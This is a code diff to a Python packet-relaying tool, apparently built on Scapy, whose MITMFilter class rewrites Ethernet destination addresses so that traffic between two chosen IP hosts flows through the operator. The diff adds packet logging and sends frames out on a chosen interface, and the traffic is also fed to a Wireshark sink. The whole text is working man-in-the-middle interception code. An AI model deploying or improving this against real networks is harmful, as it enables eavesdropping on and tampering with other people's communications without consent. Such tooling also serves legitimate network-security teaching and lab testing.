@@ -17,6 +17,7 @@ class MITMFilter(Drain):
         self.mac_a = mac_a
         self.mac_b = mac_b
     def push(self, msg):
+        print(f"MITMFilter: {msg.show()}")
         if msg.haslayer(IP):
             if msg[IP].src == self.ip_a and msg[IP].dst == self.ip_b:
                 msg[Ether].dst = self.mac_b
@@ -26,8 +27,12 @@ class MITMFilter(Drain):
                 self._send(msg)
 
 class Forwarder(Sink):
+    def __init__(self, iface):
+        Sink.__init__(self, name=None)
+        self.iface = iface
+
     def push(self, msg):
-        send(msg)
+        sendp(msg, iface=self.iface, verbose=False)
     
 
 def main():
@@ -45,7 +50,7 @@ def main():
     print(f"MAC address of {args.ip_b}: {mac_b}")
 
     filter = MITMFilter(args.ip_a, args.ip_b, mac_a, mac_b)
-    forwarder = Forwarder()
+    forwarder = Forwarder(iface=args.iface)
     wire = WiresharkSink()
     source > filter
     filter > forwarder
